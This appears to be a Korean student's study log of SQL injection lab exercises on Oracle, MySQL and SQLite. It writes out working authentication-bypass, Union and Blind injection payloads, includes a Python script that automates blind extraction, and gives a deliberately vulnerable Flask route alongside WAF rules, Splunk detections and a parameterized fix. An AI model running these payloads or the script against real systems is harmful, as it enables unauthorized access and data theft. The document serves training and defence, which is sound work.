# 📄 2025.01.28 (Day 63) - SQL Injection 공격 기법

---

## 1. 핵심 개념 정리

### SQL Injection 기본 원리

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 1 | SQL Injection 정의 | 사용자 입력값을 통해 SQL 쿼리문을 조작하여 비정상적인 DB 접근을 시도하는 공격 기법 | 웹 애플리케이션 취약점 중 가장 위험도가 높은 공격 유형으로, OWASP Top 10에 지속적으로 포함됨 |
| 2 | 인증 우회 메커니즘 | 로그인 쿼리에 `or '1'='1'` 같은 항상 참인 조건을 삽입하여 인증 로직을 무력화 | 실제 계정 정보 없이도 관리자 권한 탈취 가능 |
| 3 | 주석 처리 공격 | `--` 또는 `/* */`를 사용해 쿼리의 나머지 부분을 무효화 | 비밀번호 검증 로직을 완전히 우회할 수 있어 매우 위험 |
| 4 | 쿼리 구조 파악 | 에러 메시지와 응답 패턴을 분석하여 백엔드 쿼리 구조를 역추적 | 공격자는 반복적인 시도를 통해 DB 스키마를 점진적으로 파악 |
| 5 | DBMS별 문법 차이 | Oracle, MySQL, SQLite 등 각 DBMS마다 주석, 함수, 메타데이터 테이블이 상이함 | 공격 탐지 시 사용된 문법을 통해 공격자의 타겟 DBMS를 역추적 가능 |

### Union-based SQL Injection

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 6 | Union 연산자 활용 | 정상 쿼리 결과와 공격 쿼리 결과를 합쳐서 출력 | 실무에서는 0.1% 수준으로 낮지만, 성공 시 대량의 데이터 탈취 가능 |
| 7 | 컬럼 개수 매칭 | `ORDER BY` 절을 이용해 원본 쿼리의 컬럼 개수를 파악 후, 동일한 개수로 Union 쿼리 구성 | 컬럼 개수 불일치 시 ORA-01789 에러 발생 |
| 8 | 자료형 일치 요구사항 | Oracle은 대응 컬럼의 자료형이 정확히 일치해야 하며, `null`로 시작해 하나씩 자료형 테스트 | MySQL은 자료형 검증이 느슨하나 Oracle은 엄격함 (ORA-01790 에러) |
| 9 | 메타데이터 테이블 활용 | `user_tables`, `user_tab_columns` (Oracle) 또는 `information_schema.tables` (MySQL)를 통해 DB 구조 파악 | 메타데이터 접근 권한이 있는 경우 전체 DB 스키마 노출 위험 |
| 10 | 단계적 데이터 탈취 | 테이블명 → 컬럼명 → 실제 데이터 순으로 점진적 정보 수집 | 각 단계마다 로그에 흔적이 남으므로 SIEM에서 연속된 패턴 탐지 가능 |

### Blind SQL Injection

| # | 핵심 개념 | 설명 | 실무/보안 관점 |
|:---:|:---|:---|:---|
| 11 | Blind SQL Injection 정의 | 쿼리 결과가 화면에 직접 출력되지 않고, 참/거짓 또는 응답 시간 차이만 확인 가능한 환경에서의 공격 | 실무에서 가장 흔하게 발생하는 SQL Injection 유형 |
| 12 | Boolean-based Blind | 조건의 참/거짓에 따라 화면 출력이 달라지는 것을 이용 | 게시물 표시 여부, 로그인 성공/실패 메시지 차이 등을 활용 |
| 13 | 이진 탐색 기법 | ASCII 코드 비교를 통해 한 글자씩 데이터 추출 | 효율적인 데이터 추출을 위해 이진 탐색 알고리즘 사용 |
| 14 | length() 함수 활용 | 데이터의 길이를 먼저 파악한 후 한 글자씩 추출 | 추출할 데이터의 범위를 미리 알아야 효율적 |
| 15 | substr() 함수 활용 | 문자열의 특정 위치 문자를 추출하여 ASCII 코드로 비교 | Oracle: substr(), MySQL: substring(), SQLite: substr() |

---

## 2. 실습 내용 정리

### 실습 63-1: Oracle SQL Injection - 주석을 이용한 인증 우회 (문제 2번)

**목표:** 주석 문자를 활용하여 비밀번호 검증 로직을 무력화하고 로그인 인증 우회

**실습 환경:**
- 대상: Oracle 기반 로그인 시스템
- 취약점: 사용자 입력값이 쿼리에 직접 삽입
- 제약사항: and, or 키워드 필터링 존재

**실습 단계:**
```sql
# 1. 쿼리문 유추
SELECT * FROM users WHERE loginId = '입력값' AND pass = '입력값2'

# 2. 공격 포인트 파악
# Hint: and, or 필터링 존재 → 주석 문자 사용 가능 여부 확인

# 3. 주석을 이용한 비밀번호 검증 우회
아이디: z_answer@eqst3.com'--
비밀번호: (아무거나)

# 실제 실행되는 쿼리:
SELECT * FROM users WHERE loginId = 'z_answer@eqst3.com'--' AND pass = '입력값2'
# -- 이후가 주석 처리되어 password 체크 무시됨

# 4. 로그인 성공
→ 비밀번호 검증 없이 z_answer@eqst3.com 계정으로 로그인 성공
→ 정답: exam_answer_complete
```

**공격 메커니즘:**
```
핵심 원리:
1. Oracle의 주석 문자 --를 입력값에 삽입

2. -- 뒤의 모든 쿼리가 주석 처리되어 실행되지 않음

3. AND pass = '입력값2' 부분이 무효화되어 비밀번호 검증 우회

제약사항 우회:
- and, or 키워드가 필터링되어 있어도 주석 문자는 차단되지 않음
- 주석 처리로 필터링된 키워드를 우회할 필요가 없음
```

**보안 인사이트:**
- 특정 키워드만 필터링하는 블랙리스트 방식은 우회가 쉬움
- 주석 문자(`--`, `#`, `/* */`)도 반드시 필터링 대상에 포함해야 함
- 근본적 해결책은 Prepared Statement 사용

### 실습 63-2: Oracle SQL Injection - OR 조건을 이용한 인증 우회 (문제 3번)

**목표:** 주석이 차단된 환경에서 OR 논리 연산자를 활용한 인증 우회

**실습 환경:**
- 대상: Oracle 기반 로그인 시스템
- 취약점: 사용자 입력값이 쿼리에 직접 삽입
- 제약사항: 주석 문자(--, /*, #) 필터링

**실습 단계:**
```sql
# 1. 쿼리문 유추
SELECT * FROM users WHERE loginId = '입력값' AND pass = '입력값2'

# 2. 공격 포인트 파악
# 주석 문자 차단 확인 → OR 조건 논리 우회 시도

# 3. OR 조건을 이용한 논리 우회
아이디: z_answer@eqst3.com' or '1' ='2
비밀번호: (아무거나)

# 실제 실행되는 쿼리:
SELECT * FROM users WHERE loginId = 'z_answer@eqst3.com' or '1' = '2' AND pass = '입력값'

# 4. SQL 연산자 우선순위에 따른 평가
# AND가 OR보다 우선순위가 높으므로:
# loginId = 'z_answer@eqst3.com' OR ('1' = '2' AND pass = '입력값')
#          참                  OR          거짓
#                    → 최종 결과: 참

# 5. 로그인 성공
→ z_answer@eqst3.com 계정으로 로그인 성공
→ 정답: eqst_anwerexam
```

**SQL 논리 연산자 우선순위:**
```
우선순위 순서 (높은 순서대로):
1. 괄호 ()
2. NOT
3. AND
4. OR

적용 예시:
WHERE A OR B AND C
→ WHERE A OR (B AND C)로 평가됨

공격 활용:
- AND 우선순위가 높아 뒤쪽 조건이 먼저 평가됨
- 앞의 OR 조건만 참이면 전체가 참으로 평가
```

**보안 고려사항:**
```
탐지 포인트:
- 입력값에 ' or ' 패턴 포함
- 항상 참/거짓인 조건 ('1'='1', '1'='2' 등)
- 싱글쿼트(') 뒤 SQL 키워드 출현

방어 방법:
→ Prepared Statement 사용 (근본적 해결)
→ 화이트리스트 방식 입력값 검증
→ WAF에서 ' or ' 패턴 탐지 및 차단
→ 에러 메시지 상세 정보 노출 차단
```

### 실습 63-3: Oracle Blind SQL Injection - Boolean-based (문제 4번)

**목표:** 게시판 검색 기능을 이용하여 Blind SQL Injection으로 DB 사용자명 추출

**실습 환경:**
- 대상: Oracle 기반 게시판 검색 시스템
- 취약점: LIKE 검색 쿼리에 입력값 직접 삽입
- 조건: 쿼리 결과가 화면에 직접 노출되지 않음 (게시물 표시 여부만 확인 가능)

**실습 단계:**
```sql
# 1. 쿼리문 유추
SELECT 제목, 내용, 작성자, 날짜 FROM 게시판 WHERE 제목 LIKE '%검색어%'

# 2. 공격 포인트 파악
# 정상 문자열 검색 시 게시물 표시 확인
# 조건이 참이면 게시물 표시, 거짓이면 미표시

# 3. DB 사용자명 길이 확인
검색어: test%' and length(user)=4 and '1%'='1
→ 게시물 표시됨 → user 길이가 4글자임을 확인

# 4. 첫 번째 글자 추출 (이진 탐색)
검색어: test%' and (select ascii(substr(user,1,1)) from dual) > 83 and '1%'='1
→ 게시물 표시 안됨 → 첫 글자 ASCII 값이 83 이하

검색어: test%' and (select ascii(substr(user,1,1)) from dual) > 73 and '1%'='1
→ 게시물 표시됨 → 첫 글자 ASCII 값이 73보다 큼

검색어: test%' and (select ascii(substr(user,1,1)) from dual) = 73 and '1%'='1
→ 게시물 표시됨 → 첫 글자는 'I' (ASCII 73)

# 5. 두 번째 글자 추출
검색어: test%' and (select ascii(substr(user,2,1)) from dual) > 78 and '1%'='1
→ 이진 탐색 반복하여 'N' (ASCII 78) 확인

# 6. 세 번째 글자 추출
검색어: test%' and (select ascii(substr(user,3,1)) from dual) > 70 and '1%'='1
→ 'F' (ASCII 70) 확인

# 7. 네 번째 글자 추출
검색어: test%' and (select ascii(substr(user,4,1)) from dual) > 54 and '1%'='1
→ '6' (ASCII 54) 확인

# 8. 최종 결과
→ user = INF6
→ 정답: INF6
```

**Blind SQL Injection 원리:**
```
동작 방식:
1. 쿼리 결과가 직접 출력되지 않으므로 참/거짓 차이를 활용

2. length() 함수로 데이터 길이를 먼저 파악

3. substr()로 한 글자씩 추출하고 ascii()로 ASCII 코드 값 비교

4. 이진 탐색으로 효율적으로 각 글자의 ASCII 값 특정

실제 실행되는 쿼리 예시:
SELECT 제목, 내용, 작성자, 날짜 FROM 게시판 
WHERE 제목 LIKE '%test%' and length(user)=4 and '1%'='1%'

조건이 참이면:
- 검색 결과 게시물 표시

조건이 거짓이면:
- 검색 결과 없음 (게시물 미표시)
```

**이진 탐색 알고리즘:**
```
ASCII 코드 범위: 0 ~ 127

1단계: 중간값 64와 비교
> 64? → YES → 범위: 65~127
> 64? → NO  → 범위: 0~64

2단계: 새로운 중간값과 비교
범위가 65~127이면 중간값 96
> 96? → YES → 범위: 97~127
> 96? → NO  → 범위: 65~96

3단계: 반복
최종적으로 정확한 ASCII 값 특정

효율성:
- 127개 문자를 최대 7번 비교로 특정 가능
- log2(127) ≈ 7
```

**보안 고려사항:**
```
탐지 포인트:
- length(), substr(), ascii() 함수 연속 사용
- 동일 IP에서 유사한 쿼리 반복 (이진 탐색 패턴)
- 게시판 검색에서 게시물과 무관한 조건 삽입

방어 방법:
→ Prepared Statement 사용
→ 에러 메시지 및 참/거짓 응답 차이 최소화
→ Rate Limiting으로 반복 시도 차단
→ SIEM에서 Blind SQL Injection 패턴 탐지 룰 생성
```

### 실습 63-4: Oracle Union SQL Injection - 테이블 및 데이터 탈취 (문제 10번)

**목표:** Union 연산자를 이용하여 시스템 테이블 조회 후 특정 테이블의 데이터 탈취

**실습 환경:**
- 대상: Oracle 기반 주소 검색 시스템
- 취약점: 검색어 입력값 필터링 미흡
- 쿼리 구조: 5개 컬럼 SELECT

**실습 단계:**
```sql
# 1. 쿼리문 유추
SELECT 우편번호, 시, 구, 동, 기타 FROM 주소 WHERE 주소 LIKE '%검색어%'

# 2. 컬럼 개수 확인
검색어: 삼성동%' order by 1 --  (성공)
검색어: 삼성동%' order by 5 --  (성공)
검색어: 삼성동%' order by 6 --  (에러 발생)
→ 컬럼 개수: 5개

# 3. Union 테스트 및 자료형 확인
검색어: 삼성동%' union select 'ㄱ','ㄴ','ㄷ','ㄹ','ㅁ' from dual where 'q%'='q
→ 모두 문자형 확인

# 4. 테이블명 탈취
검색어: 삼성동%' union select table_name,null,null,null,null from user_tables where 'q%'='q

→ 결과:
- MEMBER
- SQL_UNION_ANSWER
- ADDRESS
- ...

# 5. SQL_UNION_ANSWER 테이블의 컬럼명 탈취
검색어: 삼성동%' union select column_name,null,null,null,null from user_tab_columns where table_name='SQL_UNION_ANSWER' and 'q%'='q

→ 결과:
- ANSWER_COLUMN
- REG_ACCT_ID
- REG_DT
- UDT_ACCT_ID
- UDT_DT

# 6. 데이터 탈취
검색어: 삼성동%' union select ANSWER_COLUMN,null,null,null,null from SQL_UNION_ANSWER where 'q%'='q

→ 결과: this_is_perfect_answer
→ 정답: this_is_perfect_answer
```

**Union SQL Injection 실행 쿼리:**
```sql
# 최종 실행되는 쿼리:
SELECT 우편번호, 시, 구, 동, 기타 FROM 주소 
WHERE 주소 LIKE '%삼성동%' 
union 
select ANSWER_COLUMN,null,null,null,null from SQL_UNION_ANSWER 
where 'q%'='q%'

# 결과:
- 정상 주소 검색 결과 (삼성동 관련)
- UNION으로 추가된 SQL_UNION_ANSWER 테이블 데이터
```

**Union 제약사항:**
```
필수 조건:
1. 컬럼 개수 일치
   - ORDER BY로 원본 쿼리 컬럼 개수 파악
   - Union 쿼리도 동일한 개수로 구성

2. 자료형 일치 (Oracle은 엄격)
   - null 값으로 테스트
   - 문자형, 숫자형, 날짜형 순차 테스트

3. 메타데이터 접근 권한
   - user_tables: 사용자 소유 테이블
   - user_tab_columns: 사용자 소유 테이블의 컬럼
   - all_tables: 접근 가능한 모든 테이블
```

**보안 인사이트:**
- Union SQL Injection은 한 번에 대량의 데이터 탈취 가능
- 메타데이터 테이블 접근 권한을 웹 애플리케이션 계정에서 제거 필수
- user_tables 조회 시도는 즉시 SIEM 알림 생성 필요

### 실습 63-5: MySQL Union SQL Injection - information_schema 활용 (문제 10번)

**목표:** MySQL의 information_schema를 활용하여 테이블 구조 파악 후 데이터 탈취

**실습 환경:**
- 대상: MySQL 기반 주소 검색 시스템
- 취약점: LIKE 검색 쿼리에 입력값 직접 삽입
- DBMS 특성: 자료형 검증이 Oracle보다 느슨함

**실습 단계:**
```sql
# 1. 쿼리문 유추
SELECT 우편번호, 주소1, 주소2, 주소3, 기타 FROM 주소_테이블 WHERE 주소 LIKE '%검색어%'

# 2. 컬럼 개수 확인
검색어: test%' order by 5 #  (성공)
검색어: test%' order by 6 #  (에러)
→ 컬럼 개수: 5개

# 3. Union 테스트 (존재하지 않는 값으로 검색)
검색어: abcde%' union select '1','2','3','4','5' #
→ Union 결과만 화면에 표시됨

# 4. 테이블명 탈취
검색어: abcde%' union select table_name,'2','3','4','5' from information_schema.tables where table_schema=database() #

→ 결과:
- address
- union_answer
- members
- ...

# 5. union_answer 테이블의 컬럼명 탈취
검색어: abcde%' union select column_name,'2','3','4','5' from information_schema.columns where table_name='union_answer' #

→ 결과:
- id
- answer_column (10글자 이상 조건 만족)
- created_at
- ...

# 6. 데이터 탈취
검색어: abcde%' union select answer_column,'2','3','4','5' from union_answer #

→ 결과: this_is_answer_answer
→ 정답: this_is_answer_answer
```

**MySQL vs Oracle 차이점:**
```
메타데이터 조회:
- Oracle: user_tables, user_tab_columns
- MySQL: information_schema.tables, information_schema.columns

주석 문자:
- Oracle: --, /* */
- MySQL: --, #, /* */
  (# 주석은 URL 인코딩 시 %23)

자료형 검증:
- Oracle: 매우 엄격 (ORA-01790 에러)
- MySQL: 상대적으로 느슨 (자동 형변환 시도)

database() 함수:
- 현재 사용 중인 데이터베이스명 반환
- WHERE table_schema=database()로 현재 DB의 테이블만 조회
```

**information_schema 구조:**
```
주요 테이블:
- information_schema.tables
  : 모든 데이터베이스의 테이블 정보
  
- information_schema.columns
  : 모든 테이블의 컬럼 정보
  
- information_schema.table_constraints
  : 제약조건 정보 (PRIMARY KEY, FOREIGN KEY 등)

활용 방법:
SELECT table_name FROM information_schema.tables 
WHERE table_schema = 'target_db';

SELECT column_name FROM information_schema.columns 
WHERE table_name = 'target_table' AND table_schema = 'target_db';
```

**보안 고려사항:**
```
탐지 포인트:
- information_schema 접근 로그
- database() 함수 사용
- # 주석 사용 (%23으로 URL 인코딩)

방어 방법:
→ Prepared Statement 사용
→ information_schema 접근 제한 (가능한 경우)
→ WAF에서 information_schema 키워드 탐지
→ MySQL 계정 권한 최소화
```

### 실습 63-6: SQLite Union SQL Injection - sqlite_master 활용

**목표:** SQLite의 sqlite_master 시스템 테이블을 이용한 DB 스키마 파악 및 관리자 계정 탈취

**실습 환경:**
- 대상: http://192.168.0.156/ (SQLite 기반 회원 검색 시스템)
- 취약점: 이름 검색 쿼리에 입력값 직접 삽입
- 목표: 관리자 ID와 비밀번호 탈취

**실습 단계:**
```sql
# 1. 쿼리문 유추
SELECT 이름, 점수, 지역, 취미, 나이 FROM member WHERE 이름 LIKE '%검색어%'

# 2. 공격 포인트 파악
검색어: '
→ 에러 발생 → SQL Injection 취약점 확인

# 3. 컬럼 개수 확인
검색어: ' ORDER BY 5--
→ 정상 동작
검색어: ' ORDER BY 6--
→ 에러 발생
→ 컬럼 개수: 5개

# 4. sqlite_master로 테이블명 탈취
검색어: ' UNION SELECT 1,2,3,4,tbl_name FROM sqlite_master WHERE type='table'--

→ 결과:
- member
- profile
- sqlite_sequence

# 5. member 테이블의 CREATE 문 확인
검색어: ' UNION SELECT 1,2,3,4,sql FROM sqlite_master WHERE type='table' AND tbl_name='member'--

→ 결과:
CREATE TABLE "member" ( 
  "idx" INTEGER, 
  "id" INTEGER UNIQUE, 
  "name" INTEGER, 
  "password" INTEGER, 
  PRIMARY KEY("idx" AUTOINCREMENT) 
)

# 6. 컬럼명 확인
CREATE 문에서 확인:
- idx
- id
- name
- password

# 7. 관리자 계정 데이터 탈취
검색어: ' UNION SELECT id, password, name, idx, 5 FROM member--

→ 결과:
- admin / passw0rd
- user01 / 1234
- test / test123
...

→ 정답: admin / passw0rd
```

**sqlite_master 테이블 구조:**
```
sqlite_master 컬럼:
- type: 객체 타입 (table, index, view 등)
- name: 객체 이름
- tbl_name: 테이블 이름
- rootpage: 루트 페이지 번호
- sql: CREATE 문 전체

특징:
- SQLite는 모든 스키마 정보를 sqlite_master에 저장
- 한 번의 쿼리로 전체 DB 구조 파악 가능
- sql 컬럼에서 CREATE TABLE 문을 그대로 확인 가능

보안 위험:
- Oracle, MySQL보다 정보 노출이 쉬움
- 메타데이터 접근 제어가 어려움
```

**SQLite 특이사항:**
```
자료형:
- INTEGER
- TEXT
- REAL
- BLOB
- NULL

동적 타이핑:
- 컬럼에 선언된 타입과 다른 타입도 저장 가능
- 예: INTEGER 컬럼에 TEXT 값 삽입 가능

주석:
- -- (한 줄 주석)
- /* */ (여러 줄 주석)

행 제한:
- LIMIT 구문 사용
- ROWNUM 없음
```

**보안 인사이트:**
- SQLite는 임베디드 DB로 설계되어 보안 기능이 제한적
- sqlite_master 접근을 막을 수 없으므로 애플리케이션 레벨 방어 필수
- 웹 애플리케이션에서 SQLite 사용 시 특히 주의 필요

---

## 3. DBMS별 SQL Injection 비교표

### Oracle vs MySQL vs SQLite 차이점

| 항목 | Oracle | MySQL | SQLite | 보안 분석가 관점 |
|:---:|:---|:---|:---|:---|
| **주석 처리** | `--` (공백 필요), `/* */` | `--` (공백 필요), `#`, `/* */` | `--` (공백 필요), `/* */` | MySQL의 `#` 주석은 URL 인코딩(%23) 문제로 탐지 회피에 자주 사용됨 |
| **메타데이터 조회** | `user_tables`, `user_tab_columns`, `all_tables` | `information_schema.tables`, `information_schema.columns` | `sqlite_master` (모든 스키마 한 번에 노출) | SQLite는 단 하나의 쿼리로 전체 DB 구조 파악 가능 |
| **자료형 검증** | 매우 엄격 (ORA-01790 에러) | 상대적으로 느슨 (자동 형변환) | 동적 타이핑 (타입 불일치 허용) | Oracle 환경에서는 자료형 테스트가 필수적이며, 로그에 명확히 남음 |
| **행 제한 구문** | `ROWNUM = 1` | `LIMIT 1` | `LIMIT 1` | Blind SQL Injection에서 단일 행 추출을 위해 필수적으로 사용됨 |
| **문자열 결합** | `||` 또는 `CONCAT` | `CONCAT` 또는 `||` (MySQL 8.0+) | `||` | 여러 컬럼을 하나로 합쳐 추출할 때 사용 |
| **Null 처리** | `null`, `''` (빈 문자열과 구분) | `null`, `''` (혼용 가능) | `null`, `''` (혼용 가능) | Union 쿼리 작성 시 자료형 맞추기 위해 활용 |

### SQL Injection 공격 유형별 특징

| 공격 유형 | 탐지 난이도 | 데이터 추출 속도 | 필요 조건 | 실무 적용 빈도 |
|:---|:---|:---|:---|:---|
| **Union-based** | 중간 | 빠름 (한 번에 대량 추출) | 쿼리 결과가 화면에 출력되어야 함 | 0.1% (최근 감소 추세) |
| **Blind SQL Injection** | 높음 | 매우 느림 (참/거짓 판별만 가능) | 응답 차이만 확인 가능 | 높음 (실무에서 가장 흔함) |
| **Error-based** | 낮음 | 느림 (한 번에 하나씩) | 에러 메시지가 상세히 노출되어야 함 | 에러 메시지 노출 설정이 여전히 많아 유효 |
| **Time-based** | 매우 높음 | 매우 느림 | 응답 시간 차이로만 판별 | 높음 (완전히 Blind 환경에서 사용) |

---

## 4. 심화 분석

### SQL Injection 공격 단계별 상세 분석

| 구분 | 탐지 및 정찰 | 쿼리 구조 파악 | 데이터 추출 | 보안 분석 포인트 |
|:---:|:---|:---|:---|:---|
| **1단계** | 입력란에 `'`, `"`, `)` 등 특수문자 입력 | 에러 메시지 또는 응답 차이 분석 | 성공적인 공격 벡터 확정 | WAF 우회 시도 패턴, 반복적인 에러 유발 |
| **2단계** | SQL 키워드 삽입 (`and`, `or`, `union`) | 주석 처리로 나머지 쿼리 무효화 | 컬럼 개수 및 자료형 파악 | `ORDER BY`, `null` 값 연속 시도 로그 |
| **3단계** | 항상 참인 조건 삽입 (`'1'='1'`) | 메타데이터 테이블 접근 시도 | 테이블명 및 컬럼명 탈취 | `user_tables`, `information_schema`, `sqlite_master` 조회 로그 |
| **4단계** | Union 또는 Blind 기법 선택 | 타겟 테이블 및 컬럼 선정 | 실제 민감 데이터 추출 | 비정상적으로 많은 행 반환 또는 특정 계정 반복 조회 |

### Blind SQL Injection 이진 탐색 알고리즘

```python
# [Blind SQL Injection 자동화 스크립트 예시]
import requests

def blind_sqli_binary_search(url, param_name, query_template, min_val=32, max_val=126):
    """
    이진 탐색을 이용한 Blind SQL Injection
    ASCII 코드 범위: 32(공백) ~ 126(~)
    """
    result = ""
    position = 1
    
    while True:
        low = min_val
        high = max_val
        found = False
        
        while low <= high:
            mid = (low + high) // 2
            
            # ASCII 값이 mid보다 큰지 확인
            payload = query_template.format(position=position, ascii_val=mid)
            params = {param_name: payload}
            
            response = requests.get(url, params=params)
            
            # 게시물이 표시되면 조건이 참
            if "게시물" in response.text:
                low = mid + 1
            else:
                high = mid - 1
        
        # 최종 ASCII 값 확정
        final_ascii = high
        
        # NULL 또는 끝 확인
        if final_ascii < min_val:
            break
            
        result += chr(final_ascii)
        position += 1
        found = True
    
    return result

# 사용 예시
url = "http://target.com/board/search"
param_name = "keyword"
query_template = "test%' and (select ascii(substr(user,{position},1)) from dual) > {ascii_val} and '1%'='1"

extracted_user = blind_sqli_binary_search(url, param_name, query_template)
print(f"추출된 사용자명: {extracted_user}")
```

### 공격 시나리오 및 방어 코드

```python
# [취약한 검색 기능 코드]
@app.route("/board/search")
def search():
    keyword = request.args.get('keyword')
    
    # 입력값을 직접 쿼리에 삽입 (취약)
    query = f"SELECT title, content, author FROM board WHERE title LIKE '%{keyword}%'"
    result = db.execute(query)
    
    return render_template('board.html', posts=result)


# [공격 예시 1: Union-based]
# 사용자 입력: test%' union select table_name,null,null from user_tables where 'q%'='q
# 실행되는 쿼리:
# SELECT title, content, author FROM board 
# WHERE title LIKE '%test%' union select table_name,null,null from user_tables where 'q%'='q%'
# 결과: 모든 테이블명 노출


# [공격 예시 2: Blind SQL Injection]
# 사용자 입력: test%' and length(user)=4 and '1%'='1
# 실행되는 쿼리:
# SELECT title, content, author FROM board 
# WHERE title LIKE '%test%' and length(user)=4 and '1%'='1%'
# 결과: 조건이 참이면 게시물 표시, 거짓이면 미표시


# [방어 코드 - Prepared Statement 사용]
@app.route("/board/search")
def search():
    keyword = request.args.get('keyword')
    
    # Parameterized Query 사용 (안전)
    query = "SELECT title, content, author FROM board WHERE title LIKE ?"
    result = db.execute(query, (f'%{keyword}%',))
    
    return render_template('board.html', posts=result)

# 설명:
# - 사용자 입력값은 쿼리 실행 시 '데이터'로만 취급
# - SQL 구문이 입력되어도 단순 문자열로 처리
# - LIKE 패턴에도 안전하게 적용 가능
```

---

## 5. 실무/보안 적용

### 보안 전문가 관점 - SQL Injection 탐지 및 대응

| 단계/유형 | 탐지 포인트 | 로그 예시 | 대응 방안 |
|:---:|:---|:---|:---|
| **초기 탐지** | - 입력란에 특수문자 (`'`, `"`, `-`, `;`) 포함<br>- SQL 키워드 (`select`, `union`, `and`, `or`) 연속 출현<br>- 주석 기호 포함 (`--`, `#`, `/* */`) | `GET /search?q=test%27+union+select`<br>`GET /board?kw=test%27+and+1=1--` | - WAF Rule 업데이트로 SQL 키워드 패턴 차단<br>- 입력값 길이 및 특수문자 제한<br>- Rate Limiting으로 반복 시도 차단 |
| **메타데이터 접근** | - `user_tables`, `information_schema` 조회<br>- `sqlite_master` 접근<br>- 시스템 함수 호출 (`length()`, `substr()`, `ascii()`) | `SELECT table_name FROM user_tables`<br>`SELECT * FROM sqlite_master`<br>`length(user)`, `ascii(substr())` | - DB 계정 권한 최소화 (메타데이터 조회 불필요)<br>- 시스템 스키마 함수 실행 권한 제거<br>- SIEM에서 메타데이터 조회 알림 생성 |
| **Blind SQL Injection** | - 동일 IP에서 유사 쿼리 반복<br>- length(), substr(), ascii() 패턴<br>- 이진 탐색 패턴 (> 연산자 반복) | `test%27+and+length(user)=4`<br>`test%27+and+ascii(substr(user,1,1))>83`<br>반복 횟수: 20~50회 | - 동일 IP의 반복 요청 탐지<br>- 이진 탐색 패턴 인식<br>- Rate Limiting 강화<br>- CAPTCHA 도입 |
| **데이터 탈취 시도** | - 단일 요청에서 수백~수천 행 반환<br>- 민감 테이블 (`member`, `user`, `account`) 반복 조회<br>- Union으로 메타데이터와 실제 데이터 동시 조회 | `SELECT ... UNION SELECT id, pw FROM member`<br>`ORA-20000 에러 5회 연속` | - 즉시 해당 세션 차단<br>- IP 블랙리스트 등록<br>- 침해사고 대응팀 즉시 알림<br>- 변조된 데이터 롤백 준비 |

### WAF 및 IPS 룰셋 예시

```bash
# ModSecurity (WAF) Rule 예시

# Rule 1: SQL Injection 키워드 탐지
SecRule ARGS "@rx (union|select|insert|update|delete|drop|alter|create|exec)" \
    "id:1001,phase:2,deny,status:403,msg:'SQL Injection Detected'"

# Rule 2: 주석 기호 탐지
SecRule ARGS "@rx (--|#|/\*|\*/)" \
    "id:1002,phase:2,deny,status:403,msg:'SQL Comment Character Detected'"

# Rule 3: 메타데이터 테이블 접근 탐지
SecRule ARGS "@rx (information_schema|user_tables|user_tab_columns|sqlite_master)" \
    "id:1003,phase:2,deny,status:403,msg:'Metadata Table Access Attempt'"

# Rule 4: Blind SQL Injection 함수 탐지
SecRule ARGS "@rx (length|substr|substring|ascii|char|ord)" \
    "id:1004,phase:2,deny,status:403,msg:'Blind SQL Injection Function Detected'"

# Rule 5: 과도하게 긴 입력값 차단
SecRule ARGS "@gt 200" \
    "id:1005,phase:2,deny,status:403,msg:'Input Length Exceeded'"

# Rule 6: 항상 참인 조건 탐지
SecRule ARGS "@rx ('1'='1'|'q'='q'|1=1)" \
    "id:1006,phase:2,deny,status:403,msg:'Always True Condition Detected'"
```

### SIEM 탐지 룰 예시 (Splunk)

```spl
# Blind SQL Injection 이진 탐색 패턴 탐지
index=web_logs
| rex field=uri "(?<sqli_func>length|substr|ascii)"
| stats count by src_ip, sqli_func, uri
| where count > 10
| eval severity="high"
| table src_ip, sqli_func, count, severity

# Union SQL Injection 시도 탐지
index=web_logs
| rex field=uri "union.*select"
| stats count by src_ip, uri
| where count > 3
| eval severity="critical"
| table src_ip, uri, count, severity

# 메타데이터 접근 시도 탐지
index=web_logs
| rex field=uri "(?<metadata_table>user_tables|information_schema|sqlite_master)"
| stats count by src_ip, metadata_table
| eval severity="critical"
| table src_ip, metadata_table, count, severity
```

### 보안 설정 체크리스트

```bash
# 웹 애플리케이션 보안 설정

# 1. Prepared Statement 사용 여부 확인
# Java: PreparedStatement
# Python: parameterized queries (?, %s)
# PHP: PDO with placeholders
# Node.js: parameterized queries

# 2. 에러 메시지 상세 정보 노출 차단
# 개발 환경: 상세 에러 메시지 표시 (디버깅용)
# 운영 환경: 일반화된 에러 페이지만 표시
display_errors = Off
error_reporting = E_ALL & ~E_NOTICE & ~E_WARNING

# 3. 입력값 검증 및 필터링
# 화이트리스트 방식: 허용된 문자만 통과
allowed_pattern = r'^[a-zA-Z0-9가-힣\s]+$'

# 길이 제한: 필드별 최대 길이 설정
max_length = 100

# 4. DB 계정 권한 최소화
# 웹 애플리케이션 전용 계정 생성
# SELECT, INSERT, UPDATE, DELETE만 허용
# DROP, ALTER, CREATE, GRANT 권한 제거
# 메타데이터 조회 권한 제거
GRANT SELECT, INSERT, UPDATE, DELETE ON database.* TO 'webapp'@'localhost';
REVOKE ALL PRIVILEGES ON information_schema.* FROM 'webapp'@'localhost';

# 5. WAF 및 IPS 룰셋 활성화
# SQL Injection 패턴 탐지 룰 적용
# 실시간 차단 및 알림 설정

# 6. Rate Limiting 설정
# 동일 IP의 반복 요청 제한
# Blind SQL Injection 이진 탐색 패턴 차단
```

---

## 6. 배운 점 및 인사이트

### 새로 알게 된 점

- **Blind SQL Injection의 실전 활용:** 쿼리 결과가 직접 노출되지 않는 환경에서도 참/거짓 차이를 이용해 데이터를 추출할 수 있다는 점을 직접 실습으로 확인했습니다. 특히 이진 탐색 알고리즘을 활용하면 효율적으로 데이터를 추출할 수 있음을 깨달았습니다.
- **DBMS별 메타데이터 접근 방법:** Oracle의 `user_tables`, MySQL의 `information_schema`, SQLite의 `sqlite_master`가 각각 다른 방식으로 DB 구조를 노출한다는 점을 이해했습니다. 특히 SQLite는 한 번의 쿼리로 전체 스키마를 파악할 수 있어 보안상 매우 위험함을 알았습니다.
- **SQL 연산자 우선순위의 중요성:** AND가 OR보다 우선순위가 높다는 점을 악용하여 인증을 우회할 수 있다는 점이 인상 깊었습니다. 논리 연산자의 우선순위를 정확히 이해해야 공격 쿼리를 올바르게 분석할 수 있습니다.
- **필터링 우회 기법:** and, or 키워드가 필터링되어도 주석 문자나 논리 연산자 우선순위를 이용해 우회할 수 있다는 점을 배웠습니다. 블랙리스트 방식 필터링의 한계를 명확히 이해했습니다.
